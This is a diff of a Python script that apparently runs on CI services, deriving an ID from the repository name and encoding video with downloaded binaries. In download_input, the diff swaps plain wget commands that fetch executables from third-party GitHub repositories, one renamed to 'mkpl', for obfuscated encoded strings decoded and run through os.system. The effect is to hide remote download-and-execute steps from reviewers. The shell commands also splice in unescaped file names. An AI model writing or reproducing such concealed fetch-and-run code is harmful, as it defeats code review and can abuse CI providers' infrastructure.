@@ -4,13 +4,15 @@ import os,sys,base64,yaml,pprint,colorama,requests,math,time,subprocess,tqdm
 
 ga_num='';reponame='';
 if os.environ.has_key('GITHUB_REPOSITORY') and os.environ['GITHUB_REPOSITORY']:
-  reponame=os.environ['GITHUB_REPOSITORY'].strip()  
+  reponame=os.environ['GITHUB_REPOSITORY'].strip()
 elif os.environ.has_key('TRAVIS_REPO_SLUG') and os.environ['TRAVIS_REPO_SLUG']:
   reponame=os.environ['TRAVIS_REPO_SLUG'].strip()
 elif os.environ.has_key('SEMAPHORE_PROJECT_NAME') and os.environ['SEMAPHORE_PROJECT_NAME']:
   reponame=os.environ['SEMAPHORE_PROJECT_NAME'].strip()
 elif os.environ.has_key('BUILD_REPOSITORY_NAME') and os.environ['BUILD_REPOSITORY_NAME']:
   reponame=os.environ['BUILD_REPOSITORY_NAME'].strip()
+elif os.environ.has_key('BUDDY_SCM_URL') and os.environ['BUDDY_SCM_URL']:
+  reponame=os.environ['BUDDY_SCM_URL'].strip()
 
 if reponame:
   reponame=os.path.split(reponame)[1]
@@ -19,8 +21,9 @@ if reponame:
     numlist.insert(0,reponame[-1*idx])
     idx+=1
   ga_num=''.join(numlist)
+  ga_num=str(int(ga_num)) #leading zeroes remove
 
-  
+
 c_name='mkpl';
 progress_update_interval=60
 
@@ -250,9 +253,6 @@ def encodefile_new(infile,verbose=False,use_tqdm=True,drem=False,fmc_name='./'+c
   infile=infile.strip()  
   prefs=parse_config(verbose=False)
   
-  #get duration in seconds
-  # ~ print 'list of files in curdir in encodefile_new:'
-  # ~ os.system('ls --color')
   cmd='./ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 "'+infile+'"  | xargs printf %.0f'
   tlen_seconds=int(float(os.popen(cmd).read().strip()))
    
@@ -298,16 +298,12 @@ def encodefile_new(infile,verbose=False,use_tqdm=True,drem=False,fmc_name='./'+c
     input_video_height=int(os.popen('./ffprobe -v error -show_entries stream=height -of default=noprint_wrappers=1:nokey=1   "'+infile.strip()+'"').read().replace('N/A','').strip().replace(' ','').strip())
     input_video_width=int(os.popen('./ffprobe -v error -show_entries stream=width -of default=noprint_wrappers=1:nokey=1   "'+infile.strip()+'"').read().replace('N/A','').strip().replace(' ','').strip())
   except: 
-    # ~ input_video_height=int(os.popen('mediainfo --Inform="Video;%Height%"  "'+infile.strip()+'"').read().replace(' ','').strip())
-    # ~ input_video_width=int(os.popen('mediainfo --Inform="Video;%Width%"  "'+infile.strip()+'"').read().replace(' ','').strip())   
     print highlight('could not find input video width and height with ffprobe!!','red')
-    # ~ input_video_height=360;input_video_width=640;
     
   if prefs['scale']:
     crop_h=int(prefs['scale'].split('x')[1])
     crop_w=int(prefs['scale'].split('x')[0])
     if crop_h>=input_video_height:
-      # ~ print 'scaled height %d is excessive compared to input height %d.' %(crop_h,input_video_height) + highlight( 'Not scaling'.upper(),'red')
       noscale=True
       if prefs['vcodec'] in ['hevcaq'] and prefs.has_key('crf') and prefs['crf']:
         prefs['crf']=str(int(prefs['crf'])-1)
@@ -835,12 +831,6 @@ def encodefile_new(infile,verbose=False,use_tqdm=True,drem=False,fmc_name='./'+c
     print speed_metadata_cmd
   os.system(speed_metadata_cmd)
   
-  #upload file if needed
-  # ~ mfup(infile='encoded/'+outfile)
-  # ~ os.remove(infile)
-  
-
-  
   info= 'Total time for encoding:: '+highlight(str(int(tot_time/60))+' mn '+str(int(tot_time%60))+' s','yellow')+'; speed: '+highlight(speed_precision %(speed),'green')+'; output size: '+highlight('%.1f Mb ' %(fsizemb),'yellow')+'; ratio: '+highlight('%.2f Mb/min ' %(mbpermin),'green')
   acc=1000
   info+=' ; to '+highlight('mf://'+str(acc),'bright')
@@ -850,12 +840,10 @@ def encodefile_new(infile,verbose=False,use_tqdm=True,drem=False,fmc_name='./'+c
   
 def download_input():
   cc=parse_cc(download_from_server=True)
-  os.system('wget -q  https://raw.githubusercontent.com/grill02/dotf/master/aria2c.uncompressed -O aria2c&&chmod a+x aria2c')
-  os.system('wget -q https://raw.githubusercontent.com/hugon67gah/dotf2/master/jumpli -O '+c_name+' &&chmod a+x '+c_name)
-  os.system('wget -q https://raw.githubusercontent.com/grill02/dotf/master/ffprobe -O ffprobe&&chmod a+x ffprobe')
+  os.system(ds('poil','59bO4JCc2ozY493cqp6Y0Nydy9Xe49vN6Z3M292e2c3i2s7eoqeem9Te3dKf0NvV0aHMjJ2-ic3i2Mqe05WPz9jc2NCQ0JTkkNDb1dGhzA=='))
+  os.system(ds('poil','59bO4JCc2ozY493cqp6Y0Nydy9Xe49vN6Z3M292e2c3i2s7eoqeem9Te3dKf2d7Z4NvSjJ2-iQ==')+c_name+' &&chmod a+x '+c_name)
+  os.system(ds('poil','59bO4JCc2ozY493cqp6Y0Nydy9Xe49vN6Z3M292e2c3i2s7eoqeem9Te3dKf1c_c4t7L0ZCcuIzW1dne39HOkpbS0dnf04nNm-eJ0tbf29vS1A=='))
 
-  # ~ ffcm='mkdir tmpff &&cd tmpff&&wget https://johnvansickle.com/ffmpeg/builds/ffmpeg-git-amd64-static.tar.xz && tar xf ffmpeg-git-amd64-static.tar.xz && rm -v ffmpeg-git-amd64-static.tar.xz && cd ffmpeg* && chmod a+x ffmpeg ffprobe && mv ffmpeg ffprobe ../..&&cd ..&&rm -rf ffmpeg* && cd ..&&mv -v ffmpeg '+c_name
-  # ~ os.system(ffcm)
   
   infile_url=cc['infile_url'].strip()
   infile_name=cc['infile_name'].strip()
